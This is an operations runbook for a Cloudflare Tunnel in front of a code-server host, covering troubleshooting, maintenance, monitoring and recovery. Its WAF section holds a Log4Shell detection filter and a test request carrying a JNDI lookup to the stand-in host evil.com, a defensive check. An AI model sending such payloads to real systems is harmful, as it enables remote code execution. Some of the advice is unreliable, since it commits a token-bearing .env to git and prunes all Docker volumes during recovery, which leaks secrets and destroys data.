# Cloudflare Tunnel Operations Runbook

**Document**: Production Operations Guide  
**Service**: Cloudflare Tunnel (ide.kushnir.cloud)  
**Platform**: 192.168.168.31 + Cloudflare Edge  
**Updated**: April 15, 2026

---

## Architecture

```
Internet Client
    ↓ (HTTPS to Cloudflare edge)
Cloudflare WAF/Firewall
    ↓ (Encrypted tunnel)
cloudflared daemon (192.168.168.31)
    ↓ (HTTP to localhost:8080)
code-server (internal)
```

**Key Components**:
- **Cloudflare Tunnel**: Secure encrypted connection from Cloudflare's edge to private IP (192.168.168.31:8080)
- **WAF Rules**: Block path traversal, SQL injection, scanners at Cloudflare's edge (before reaching private network)
- **DNS**: CNAME `ide.kushnir.cloud` → `{tunnel-uuid}.cfargotunnel.com` (no A record to private IP)
- **Health Checks**: Cloudflare monitors tunnel reachability every 60 seconds

**Advantages**:
✅ No firewall hole-punch (no port 8080 exposed to internet)  
✅ No reverse proxy on-prem (cloudflared is lightweight, <50MB)  
✅ DDoS protection at edge (Cloudflare absorbs attacks)  
✅ WAF rules enforce at edge (faster than iptables)  
✅ Automatic failover (if tunnel disconnects, Cloudflare returns 503)

---

## Tunnel Status Verification

### 1. **Verify Cloudflared Container is Running**

```bash
ssh akushnir@192.168.168.31

# Check container status
docker-compose ps cloudflared
# Expected: Up X minutes (healthy)

# Check recent logs
docker-compose logs -f cloudflared --tail 50
# Expected: "Connected to tunnel" OR "Authenticated tunnel"
```

### 2. **Verify Tunnel Configuration**

```bash
# Tunnel info from inside container
docker exec cloudflared cloudflared tunnel info

# Expected output:
# Your tunnel is connected to Cloudflare with:
# Token: xxxxxxxxxxxxxxx
# ID: {tunnel-uuid}
# Name: code-server-production
```

### 3. **Verify DNS Resolution**

```bash
# From your local machine:
dig ide.kushnir.cloud

# Expected:
# ide.kushnir.cloud.  300  IN  CNAME  {tunnel-uuid}.cfargotunnel.com.
# {tunnel-uuid}.cfargotunnel.com.  300  IN  A  {Cloudflare IP}

# Check it's NOT pointing to 192.168.168.31 (private IP exposure)
```

### 4. **Verify HTTPS**

```bash
# HTTPS should work with Cloudflare TLS certificate
curl -v https://ide.kushnir.cloud/healthz

# Expected:
# < HTTP/2 200
# < content-type: application/json
# { "status": "healthy", "uptime": "... hours" }
```

### 5. **Verify Tunnel Metrics in Prometheus**

```bash
# From inside the network:
curl http://prometheus:9090/api/v1/query?query=cloudflared_tunnel_status

# Expected: value = 1 (tunnel is connected)
```

---

## Common Issues & Troubleshooting

### Issue 1: Tunnel Not Connected

**Symptom**:
```
docker logs cloudflared | grep -i "error\|disconnected"
Error: Failed to authenticate tunnel
```

**Root Causes**:
1. `CLOUDFLARE_TUNNEL_TOKEN` not set in `.env`
2. Token expired or revoked in Cloudflare dashboard
3. Network connectivity issue (DNS resolution failing)
4. cloudflared version incompatible with token format

**Fix**:
```bash
# 1. Verify token is set
grep CLOUDFLARE_TUNNEL_TOKEN .env | head -c 20

# 2. Rotate token in Cloudflare dashboard
#    - Go to: dash.cloudflare.com → account → DNS → Tunnels
#    - Select "code-server-production" tunnel
#    - Click "Delete" → "Delete Tunnel"
#    - Create new tunnel → copy token
#    - Update .env: CLOUDFLARE_TUNNEL_TOKEN=xxxxx
#    - Restart: docker-compose restart cloudflared

# 3. Check network connectivity
docker exec cloudflared ping -c 2 1.1.1.1

# 4. Force pull latest image
docker pull cloudflare/cloudflared:2024.1.5
docker-compose restart cloudflared
```

---

### Issue 2: HTTPS Returns 502 Bad Gateway

**Symptom**:
```
curl https://ide.kushnir.cloud/
< HTTP/2 502
```

**Root Causes**:
1. code-server not listening on :8080
2. Docker network "enterprise" not reachable
3. Caddy certificate issues (internal TLS)
4. cloudflared can't reach localhost:8080

**Fix**:
```bash
# 1. Check code-server status
docker-compose ps code-server
# Expected: Up and healthy

# 2. Check code-server logs
docker-compose logs code-server | tail -20
# Look for errors like "bind: address already in use"

# 3. Test code-server is reachable locally
docker exec cloudflared curl -v http://code-server:8080/healthz
# Expected: HTTP 200

# 4. Check Cloudflare tunnel routes in Terraform
cat terraform/cloudflare.tf | grep -A 5 "hostname = \"ide.kushnir.cloud\""
# Should show: service = "http://{primary_host_ip}:8080"

# 5. Full restart sequence
docker-compose down cloudflared code-server
docker-compose up -d code-server
sleep 10
docker-compose up -d cloudflared
docker-compose logs cloudflared --tail 20
```

---

### Issue 3: WAF Blocking Legitimate Traffic

**Symptom**:
```
curl https://ide.kushnir.cloud/api/upload?file=document.pdf
< HTTP/2 403
< Cf-Ray: xxxxxxx-LAX
```

**Root Causes**:
1. WAF rule too aggressive (path contains `/api/` which matches some rules)
2. Legitimate query string triggers SQL injection filter
3. File upload endpoint flagged as path traversal

**Fix**:
```bash
# 1. Check Cloudflare WAF event logs
#    - Go to: dash.cloudflare.com → Security → Events
#    - Filter by "ide.kushnir.cloud"
#    - Find blocked request, check which rule triggered
#    - Cf-Ray header in curl output matches the request

# 2. Disable overly aggressive rule
#    - Go to: dash.cloudflare.com → Security → WAF Rules
#    - Find rule ID from Events
#    - Change mode: Block → Challenge (or Disable)

# 3. Add exception for legitimate path
#    - Terraform: Update firewall_filter "scanner_detection"
#    - Add condition: NOT (path = "/api/upload")
#    - Apply: cd terraform && terraform apply

# 4. Test rule change
curl https://ide.kushnir.cloud/api/upload?file=document.pdf
# Should now return 200 OK
```

---

### Issue 4: Tunnel Returns 503 Service Unavailable

**Symptom**:
```
curl https://ide.kushnir.cloud/
< HTTP/2 503
< Cf-Cache-Status: DYNAMIC
```

**Root Causes**:
1. cloudflared container crashed or exited
2. Tunnel not authenticated (token invalid)
3. Origin server (code-server) is unreachable
4. Cloudflare health check failed
5. Tunnel misconfigured in Terraform

**Fix**:
```bash
# 1. Check container status
docker-compose ps cloudflared

# 2. Restart tunnel
docker-compose restart cloudflared
sleep 5
docker-compose logs cloudflared --tail 30

# 3. Wait for health check to pass (up to 2 minutes)
# Cloudflare checks tunnel availability every 60s

# 4. Verify health check is passing
curl http://192.168.168.31:8080/healthz
# Should return 200

# 5. If still 503, check Cloudflare dashboard
#    - Go to: dash.cloudflare.com → Analytics → Tunnel Health
#    - Look for "code-server-production" tunnel
#    - Check "last seen" timestamp (should be < 1 minute ago)

# 6. Re-run Terraform (may fix mismatched config)
cd terraform
terraform plan -target=cloudflare_tunnel_config.code_server
terraform apply -target=cloudflare_tunnel_config.code_server
```

---

## Planned Maintenance

### 1. **Update Cloudflare Tunnel Image**

Cloudflare releases updates regularly. Update via Renovate or manually:

```bash
# Check current version
docker inspect cloudflare/cloudflared:latest | jq -r '.[0].RepoTags'

# Update docker-compose.yml
# OLD: image: cloudflare/cloudflared:2024.1.5
# NEW: image: cloudflare/cloudflared:2024.2.1  (as per Renovate PR)

# Test pull
docker pull cloudflare/cloudflared:2024.2.1

# Restart (zero-downtime — Cloudflare keeps tunnel alive during restart)
docker-compose up -d cloudflared
docker-compose logs cloudflared --tail 10
# Expected: "Connected to tunnel" within 30 seconds
```

---

### 2. **Rotate Tunnel Token**

Every 180 days (for security rotation):

```bash
# 1. Generate new token in Cloudflare dashboard
#    - dash.cloudflare.com → Tunnels → code-server-production
#    - Click "Rotate token"
#    - Copy new token

# 2. Update .env
sed -i "s/CLOUDFLARE_TUNNEL_TOKEN=.*/CLOUDFLARE_TUNNEL_TOKEN=${NEW_TOKEN}/" .env

# 3. Commit (without exposing token in git)
git add .env
git commit -m "chore: Rotate Cloudflare tunnel token (180-day rotation)"

# 4. Push and deploy
git push origin main
ssh akushnir@192.168.168.31 "cd code-server-enterprise && git pull && docker-compose up -d cloudflared"

# 5. Verify
docker-compose logs cloudflared | grep "Connected to tunnel"
```

---

### 3. **Update Cloudflare WAF Rules**

When new threats emerge (e.g., new CVE in Log4j):

```bash
# 1. Add rule to terraform/cloudflare.tf
cat >> terraform/cloudflare.tf << 'EOF'

resource "cloudflare_firewall_rule" "new_threat" {
  zone_id     = data.cloudflare_zone.kushnir_cloud.id
  description = "Block Log4Shell exploitation attempts"
  filter_id   = cloudflare_firewall_filter.log4shell.id
  action      = "block"
}

resource "cloudflare_firewall_filter" "log4shell" {
  zone_id     = data.cloudflare_zone.kushnir_cloud.id
  description = "Log4Shell (CVE-2021-44228)"
  expression  = "(http.request.uri.query contains \"${jndi:\") or (http.request.body contains \"${jndi:\")"
}
EOF

# 2. Apply
cd terraform && terraform apply

# 3. Test the rule (or verify in Cloudflare dashboard)
curl 'https://ide.kushnir.cloud/?x=${jndi:ldap://evil.com}'
# Should return 403 Forbidden
```

---

## Metrics & Monitoring

### **Prometheus Queries**

```promql
# Tunnel status (1 = connected, 0 = disconnected)
cloudflared_tunnel_status

# Tunnel request count (requests handled by Cloudflare)
increase(cloudflared_tunnel_requests_total[5m])

# Tunnel latency (edge → origin)
cloudflared_tunnel_latency_seconds

# Error rate from tunnel to origin
increase(cloudflared_tunnel_errors_total[5m])
```

### **Grafana Dashboard**

Import dashboard **ID: 13933** (Cloudflare Tunnel official) or build custom:

**Panels**:
1. Tunnel Status (green = connected, red = disconnected)
2. Requests/sec (from Cloudflare edge)
3. Latency p50/p95/p99 (edge → origin)
4. WAF events/hour (alerts triggered)
5. SSL/TLS certificate validity

---

## Alerting

### **AlertManager Rules**

```yaml
- alert: CloudflareTunnelDown
  expr: cloudflared_tunnel_status == 0
  for: 2m
  labels:
    severity: critical
  annotations:
    summary: "Cloudflare tunnel {{ $labels.instance }} is disconnected"
    description: "Tunnel has been down for > 2 minutes. Check container logs."

- alert: CloudflareTunnelHighErrorRate
  expr: rate(cloudflared_tunnel_errors_total[5m]) > 0.1
  for: 5m
  labels:
    severity: warning
  annotations:
    summary: "High error rate from Cloudflare tunnel"
    description: "{{ $value }} errors/sec detected. Check origin server health."

- alert: CloudflareWAFBlocking
  expr: increase(cloudflared_waf_events_total{action="block"}[1h]) > 100
  for: 15m
  labels:
    severity: warning
  annotations:
    summary: "Cloudflare WAF blocking {{ $value }} requests/hour"
    description: "Check Cloudflare dashboard for attack patterns."
```

---

## Disaster Recovery

### **Scenario 1: Tunnel Completely Down (24+ hours)**

**Impact**: `ide.kushnir.cloud` returns 503, Cloudflare tunnel unavailable

**Recovery**:
```bash
# 1. SSH to primary host
ssh akushnir@192.168.168.31

# 2. Full restart sequence
docker-compose down cloudflared
docker system prune -a --volumes
docker pull cloudflare/cloudflared:2024.1.5
docker-compose up -d cloudflared

# 3. Monitor recovery
docker-compose logs -f cloudflared
# Watch for "Connected to tunnel" message (< 2 min)

# 4. Verify DNS still resolves to Cloudflare
dig ide.kushnir.cloud
# Should show CNAME to cfargotunnel.com, NOT 192.168.168.x

# 5. Test HTTPS
curl https://ide.kushnir.cloud/healthz

# 6. If still down, check Terraform
cd terraform
terraform validate
terraform plan -target=cloudflare_tunnel_config.code_server
# Look for any configuration issues

# 7. Worst case: Recreate tunnel
#    - Delete old tunnel in Cloudflare dashboard
#    - Run: terraform destroy -target=cloudflare_tunnel.code_server
#    - Re-apply: terraform apply -target=cloudflare_tunnel.code_server
#    - Wait 10 minutes for DNS propagation
```

### **Scenario 2: Cloudflare Account Compromised**

**Impact**: Attacker can redirect ide.kushnir.cloud to phishing site

**Recovery**:
```bash
# 1. Change Cloudflare API token
#    - Go to: dash.cloudflare.com → Account → API Tokens
#    - Click "Edit" on existing token
#    - Click "Roll token"
#    - Copy new token

# 2. Update Terraform
cat > terraform/terraform.tfvars << 'EOF'
cloudflare_api_token = "new_token_here"
EOF

# 3. Re-import tunnel (to verify ownership)
terraform refresh
terraform plan

# 4. Verify no unauthorized changes in terraform.tfstate
git diff terraform/terraform.tfstate | head -50

# 5. Apply changes
terraform apply

# 6. Audit Cloudflare logs
#    - dash.cloudflare.com → Analytics → Logs
#    - Check for unauthorized DNS changes, WAF rule modifications
```

---

## References

- [Cloudflare Tunnel Docs](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/tunnel-guide/)
- [Cloudflare WAF Rules](https://developers.cloudflare.com/waf/managed-rules/)
- [OWASP Top 10 - Cloudflare WAF](https://www.cloudflare.com/waf/)
- Terraform Module: `terraform/cloudflare.tf`
- Deployment Script: `scripts/deploy-cloudflare-tunnel.sh`

---

**Last Updated**: April 15, 2026  
**Maintained By**: @kushin77  
**Escalation**: security@kushnir.cloud
